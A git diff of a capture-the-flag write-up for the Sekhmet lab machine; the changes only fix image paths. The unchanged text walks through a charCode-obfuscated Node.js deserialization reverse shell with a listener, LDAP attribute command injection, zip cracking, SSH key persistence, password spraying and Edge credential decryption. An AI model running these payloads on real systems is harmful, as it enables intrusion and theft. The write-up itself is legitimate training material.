@@ -42,7 +42,7 @@ Not a whole lot we can do with that version of OpenSSH without credentials, so I
 ## Web Server
 Navigating to the site redirects us to `www.windcorp.htb`, which I add to my `/etc/hosts` file to resolve any domain name resolution errors.
 
-![](../assets/img/2026-05-23-Sekhmet/1.png)
+![](/assets/img/2026-05-23-Sekhmet/1.png)
 
 My subdomain enumeration finds another one for portal, which is also appended to it.
 
@@ -77,32 +77,32 @@ portal                  [Status: 403, Size: 2436, Words: 234, Lines: 44, Duratio
 
 Checking out the landing page at `www.windcorp.htb` shows a site that holds general information about the organization and their services, although it's mostly Latin filler content.
 
-![](../assets/img/2026-05-23-Sekhmet/2.png)
+![](/assets/img/2026-05-23-Sekhmet/2.png)
 
 Apart from a team section that gives us potential usernames, this site doesn't hold a lot for us.
 
-![](../assets/img/2026-05-23-Sekhmet/3.png)
+![](/assets/img/2026-05-23-Sekhmet/3.png)
 
 ### Partner Portal
 Over on the portal subdomain, we find a login panel for the company's partners.
 
-![](../assets/img/2026-05-23-Sekhmet/4.png)
+![](/assets/img/2026-05-23-Sekhmet/4.png)
 
 Attempting to use default credentials such as admin:admin succeeds to log us in. The only thing on the dashboard is a banner noting that the portal is still under construction, which could mean there are insecure APIs or source code still exposed.
 
-![](../assets/img/2026-05-23-Sekhmet/5.png)
+![](/assets/img/2026-05-23-Sekhmet/5.png)
 
 With not a ton to go off of, I capture an invalid request to the login panel to see what data is being sent. This reveals a server response header disclosing that the application is built with Node.js and uses Express for the front end.
 
-![](../assets/img/2026-05-23-Sekhmet/6.png)
+![](/assets/img/2026-05-23-Sekhmet/6.png)
 
 I also test this login panel for any SQL injection which blocks me for obvious security reasons, but reveals that the site is protected with ModSecurity. I'll keep this in mind for any future vulnerabilities that arise since we'll likely need to encode our payloads to bypass this detection.
 
-![](../assets/img/2026-05-23-Sekhmet/7.png)
+![](/assets/img/2026-05-23-Sekhmet/7.png)
 
 Taking a look at our cookies shows one for the app and another to track our logged-in profile.
 
-![](../assets/img/2026-05-23-Sekhmet/8.png)
+![](/assets/img/2026-05-23-Sekhmet/8.png)
 
 ### Insecure Deserialization via Cookie
 The first I'm positive is some Node.js magic, but the second is base64 encoded. After decoding we find that we're able to manipulate our username, role, and logon time which doesn't really help us out since we are already signed in as admin.
@@ -124,7 +124,7 @@ The author provides a PoC for getting code execution as well, and after base64-e
 
 Running this gets sniped by the ModSecurity WAF as expected.
 
-![](../assets/img/2026-05-23-Sekhmet/9.png)
+![](/assets/img/2026-05-23-Sekhmet/9.png)
 
 I'll try encoding certain bad characters one at a time to see what's being filtered out. Attempting to replace the dollar signs and squiggly brackets with their Unicode variants to bypass the WAF and grab code execution fails.
 
@@ -141,7 +141,7 @@ The aforementioned article shows a method for RCE by encoding with CharCode. I'l
 └─$ echo -n '{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,52,56,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}' | base64 -w0
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/10.png)
+![](/assets/img/2026-05-23-Sekhmet/10.png)
 
 _Note: Make sure your request to the server is a GET to the web's root, I lost a lot of time wondering why my payloads weren't working until swapping my request method and then it magically worked._
 
@@ -151,7 +151,7 @@ After refreshing the page with our new cookie or sending it in a captured reques
 └─$ nc -lvnp 443
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/11.png)
+![](/assets/img/2026-05-23-Sekhmet/11.png)
 
 ## Linux Privilege Escalation
 Light enumeration on the filesystem reveals a backup.zip archive in our user's home directory. I'll transfer this to my local machine through a Netcat connection and redirectors for closer inspection.
@@ -166,7 +166,7 @@ Light enumeration on the filesystem reveals a backup.zip archive in our user's h
 
 Attempting to unzip it prompts us to enter a password, however converting it to a crackable format with tools like zip2john fails.
 
-![](../assets/img/2026-05-23-Sekhmet/12.png)
+![](/assets/img/2026-05-23-Sekhmet/12.png)
 
 ### ZipCrypto Plaintext Attack
 We can however list all files inside of it with 7zip, which shows a ton of files pertaining to the sss service. It looks like this archive will be worth pursuing because of the sensitive config files within it.
@@ -239,7 +239,7 @@ Running this same command again with the `-slt` flags gives us the metadata for 
 └─$ 7z l -slt backup.zip
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/13.png)
+![](/assets/img/2026-05-23-Sekhmet/13.png)
 
 In case you're unaware, there's a well-known plaintext attack against ZipCrypto that will allow us to break the encryption on it. The only thing we require is the contents of one of the files, and luckily `/etc/passwd` should still be mostly the same between backups. 
 
@@ -262,7 +262,7 @@ Our command to carry this out will look like so:
 - `-P plain.zip` - The plaintext zip file
 - `-p passwd` - The name of the known file in the plaintext zip.
 
-![](../assets/img/2026-05-23-Sekhmet/14.png)
+![](/assets/img/2026-05-23-Sekhmet/14.png)
 
 This will grant us keys that can be used in another bkcrack command to output the decrypted files to another archive and set a password on it. Our new command will look similar:
 
@@ -275,18 +275,18 @@ This will grant us keys that can be used in another bkcrack command to output th
 - `-U [output.zip]` - The new archive with output files
 - `[password]` - The known password for the output file
 
-![](../assets/img/2026-05-23-Sekhmet/15.png)
+![](/assets/img/2026-05-23-Sekhmet/15.png)
 
 Now we can unzip this new archive and look around these files. The main one that sticks out to me is a cache file ending in `.ldb` in the `/var/lib/sss/db` directory. This file's name indicates that it holds cached credentials for users on the `windcorp.htb` domain.
 
 ### Creds in .ldb Cache File
 If you're curious as to what files we're poking around in, the System Security Services Daemon (SSSD) is a Linux service that manages user identity, authentication, and authorization by bridging local systems with remote directories like Active Directory, LDAP, or FreeIPA. Essentially, it is what's allowing this system to connect to the domain.
 
-![](../assets/img/2026-05-23-Sekhmet/16.png)
+![](/assets/img/2026-05-23-Sekhmet/16.png)
 
 Back on the box, we can confirm that this server is connected to an internal subnet by viewing its interfaces.
 
-![](../assets/img/2026-05-23-Sekhmet/17.png)
+![](/assets/img/2026-05-23-Sekhmet/17.png)
 
 So this `.ldb` file may contain other user credentials. Running file against it shows that it's a TDB file, which is a Trivial DataBase file used by the Samba networking suite to store server configuration and state data. We can use `tdbdump`, that is also from Samba, to dump this database.
 
@@ -294,7 +294,7 @@ So this `.ldb` file may contain other user credentials. Running file against it
 └─$ tdbdump ./var/lib/sss/db/cache_windcorp.htb.ldb
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/18.png)
+![](/assets/img/2026-05-23-Sekhmet/18.png)
 
 Amidst the sea of data is a huge blob for the Ray.Duncan user that contains a hash for him. Sending this over to Hashcat or JohnTheRipper allows us to grab the plaintext version.
 
@@ -302,7 +302,7 @@ Amidst the sea of data is a huge blob for the Ray.Duncan user that contains a ha
 └─$ john ray_hash --wordlist=/opt/seclists/rockyou.txt
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/19.png)
+![](/assets/img/2026-05-23-Sekhmet/19.png)
 
 ### Abusing KSU
 We can't use this to login via SSH since he is not a user on the Linux machine, however we can request a ticket on the domain from the web server with `kinit`. Also, displaying the `/etc/krb5.conf` file reveals that the DC is named `hope.windcorp.htb`.
@@ -369,7 +369,7 @@ Immediately checking to see if we have access to escalate privileges to root usi
 webster@webserver:~$ ksu
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/20.png)
+![](/assets/img/2026-05-23-Sekhmet/20.png)
 
 At this point we can grab the user flag from the root user's home directory and begin looking at ways to pivot onto the DC. First, I'll place my public key into the root's authorized_keys file so I don't have to go through all those hoops again and to maintain access.
 
@@ -379,7 +379,7 @@ root@webserver:~# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKkq\xSi58QvP1UqH+nB
 └─$ ssh root@windcorp.htb
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/21.png)
+![](/assets/img/2026-05-23-Sekhmet/21.png)
 
 ## Pivoting to Internal Subnet
 With SSH all set up, I'll restablish a conection to configure a dynamic SOCKS proxy on my local machine so we're able to reach the DC without having to remain on the web server.
@@ -425,7 +425,7 @@ With everything all set up, I'll request a ticket for Ray.Duncan from my local m
 └─$ proxychains4 klist
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/22.png)
+![](/assets/img/2026-05-23-Sekhmet/22.png)
 
 ## Windows Foothold via PowerShell script
 Netexec seems to error out to list the shares, but swapping to smbclient works fine. There's just one non-standard share named `WC-Share`. 
@@ -434,7 +434,7 @@ Netexec seems to error out to list the shares, but swapping to smbclient works f
 └─$ proxychains4 smbclient -k -L //hope.windcorp.htb/
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/23.png)
+![](/assets/img/2026-05-23-Sekhmet/23.png)
 
 Connecting to it give us a list of users on the domain that are appended with some random string.
 
@@ -444,7 +444,7 @@ Connecting to it give us a list of users on the domain that are appended with so
 └─$ cat debug-users.txt
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/24.png)
+![](/assets/img/2026-05-23-Sekhmet/24.png)
 
 The only other interesting thing in these shares was a PowerShell script inside `NETLOGON`.
 
@@ -452,7 +452,7 @@ The only other interesting thing in these shares was a PowerShell script inside 
 └─$ proxychains4 smbclient -k //hope.windcorp.htb/NETLOGON
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/25.png)
+![](/assets/img/2026-05-23-Sekhmet/25.png)
 
 ### Updating LDAP Attribute
 The script looks to create a GUI form that takes in the mobile LDAP attribute. If this script is running, the numbers that were appended to the names in the debug-users.txt file are most likely the value of their mobile attributes.
@@ -528,11 +528,11 @@ Attempting this from my local machine was difficult so I swapped back to the web
 └─$ echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: 123456789' | ldapmodify -H ldap://hope.windcorp.htb
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/26.png)
+![](/assets/img/2026-05-23-Sekhmet/26.png)
 
 After a couple minutes and re-fetching the same file, Ray's mobile number is altered to the specified value.
 
-![](../assets/img/2026-05-23-Sekhmet/27.png)
+![](/assets/img/2026-05-23-Sekhmet/27.png)
 
 ### Command Injection
 Knowing that this script is automated, if we update this attribute to contain a payload testing for command injection, it may be possible to execute arbitrary commands via this cronjob. We can use either backticks or wrap our command in `$()` to accomplish this.
@@ -543,7 +543,7 @@ I'll first just supply a simple whoami command to see if this works at all and w
 └─$ echo -e 'dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: $(whoami)' | ldapmodify -H ldap://hope.windcorp.htb
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/28.png)
+![](/assets/img/2026-05-23-Sekhmet/28.png)
 
 Repeating the prior steps to grab the file and checking it succeeds, showing that this script is vulnerable to command injection and that it's executing as the scriptrunner user.
 
@@ -584,7 +584,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 Sending this over to Hashcat or JohnTheRipper cracks quickly and gives us valid credentials for the scriptrunner user.
 
-![](../assets/img/2026-05-23-Sekhmet/29.png)
+![](/assets/img/2026-05-23-Sekhmet/29.png)
 
 ### Password Spraying
 Looks like NTLM authentication is disabled and this user really doesn't have access to do a whole lot. Because of that, I'll spray this password across the domain using what limited permissions we have to enumerate account names via LDAP on the web server.
@@ -597,7 +597,7 @@ root@webserver:~# awk '{print $2}' usernames.txt > DomainUsers.txt
 
 Extracting these names by grepping for the _samAccountName_ and getting their values with an `awk` command gives us a very large list of users (around 600). 
 
-![](../assets/img/2026-05-23-Sekhmet/30.png)
+![](/assets/img/2026-05-23-Sekhmet/30.png)
 
 I'll use [Kerbrute](https://github.com/ropnop/kerbrute) to spray this password from the web server to avoid any dropped packets and confusion over the SOCKS proxy.
 
@@ -607,7 +607,7 @@ I'll use [Kerbrute](https://github.com/ropnop/kerbrute) to spray this password f
 root@webserver:~# ./kerbrute passwordspray -d windcorp.htb DomainUsers.txt '[REDACTED]'
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/31.png)
+![](/assets/img/2026-05-23-Sekhmet/31.png)
 
 ### Grabbing Shell
 This validates credentials for one other user named Bob.Wood, who seems to be apart of the Remote Management group, allowing us to grab a shell on the DC via WinRM.
@@ -620,11 +620,11 @@ First we'll need to grab a TGT as him through proxcychains.
 └─$ proxychains4 klist
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/32.png)
+![](/assets/img/2026-05-23-Sekhmet/32.png)
 
 Now we'll need to update our `/etc/hosts` file to resolve the DC's Fully Qualified Domain Name of `HOPE.WINDCORP.HTB` to match its IP address. This is because NTLM auth is disabled and the FQDN is required for Kerberos to work.
 
-![](../assets/img/2026-05-23-Sekhmet/33.png)
+![](/assets/img/2026-05-23-Sekhmet/33.png)
 
 With everything configured correctly, we only need to specify the FQDN and the realm to connect with Evil-WinRM.
 
@@ -632,25 +632,25 @@ With everything configured correctly, we only need to specify the FQDN and the r
 └─$ proxychains4 evil-winrm -i hope.windcorp.htb -r windcorp.htb
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/34.png)
+![](/assets/img/2026-05-23-Sekhmet/34.png)
 
 ## Windows Privilege Escalation
 Listing our group memberships and token permissions shows that we are apart of the Adminusers and IT groups.
 
-![](../assets/img/2026-05-23-Sekhmet/35.png)
+![](/assets/img/2026-05-23-Sekhmet/35.png)
 
 There was also a Script directory at the root of the `C:\` drive, but overwriting any of these didn't work to execute them after-the-fact.
 
-![](../assets/img/2026-05-23-Sekhmet/36.png)
+![](/assets/img/2026-05-23-Sekhmet/36.png)
 
 The only user we didn't have access to on the system was the Administrator, so I start looking inside all the user directories that we control. Displaying the contents of Bob's AppData folder shows that Microsoft Edge was installed and at least contains cache data.
 
-![](../assets/img/2026-05-23-Sekhmet/37.png)
+![](/assets/img/2026-05-23-Sekhmet/37.png)
 
 ### Decrypting Microsoft Edge Passwords
 A bit of research on where Microsoft Edge stores its credentials and secrets at leads me to the `C:\users\Bob.Wood\AppData\Local\Microsoft\edge\User Data\default\` directory, which contains a "Login Data" file.
 
-![](../assets/img/2026-05-23-Sekhmet/38.png)
+![](/assets/img/2026-05-23-Sekhmet/38.png)
 
 Attempting to download this file with the built-in features from Evil-WinRM just wouldn't work for some reason. I lost a lot of time here debugging my shell/connection and fiddling with AppLocker bypass techniques, but eventually realized something else was happening.
 
@@ -738,7 +738,7 @@ Let's get to it, starting with the generation of the pre-keys.
 105453c2b8a1b6f51178d1e914ef70d85c3660b8
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/39.png)
+![](/assets/img/2026-05-23-Sekhmet/39.png)
 
 To decrypt the master password, we need to grab its GUID from the blob which can be done by extracting it from localstate with jq since it's JSON data.
 
@@ -748,7 +748,7 @@ To decrypt the master password, we need to grab its GUID from the blob which can
 └─$ pypykatz dpapi describe blob blob
 ```
 
-![](../assets/img/2026-05-23-Sekhmet/40.png)
+![](/assets/img/2026-05-23-Sekhmet/40.png)
 
 Now we'll use the pre-keys to create a file containing the masterkey using the masterkey file which can be found on the machine under the `C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1–5–21–1844305427–4058123335–2739572863–2761` directory.
 
@@ -776,7 +776,7 @@ file: ../logindata.decoded user: bob.woodADM@windcorp.com pass: b'[REDACTED]' ur
 ### Admin Shell
 The final entry contains a password for Bob.WoodADM that logs into the site at `webmail.windcorp.com`, but these credentials are reused for the domain too. We can grab a TGT using this password and grab a shell via WinRM to discover that this user is an Administrator.
 
-![](../assets/img/2026-05-23-Sekhmet/41.png)
+![](/assets/img/2026-05-23-Sekhmet/41.png)
 
 Finally grabbing the root flag under the Administrator's Desktop folder completes this challenge. Overall this challenge was pretty difficult, but enumeration and research definitely paid off in the end.
 
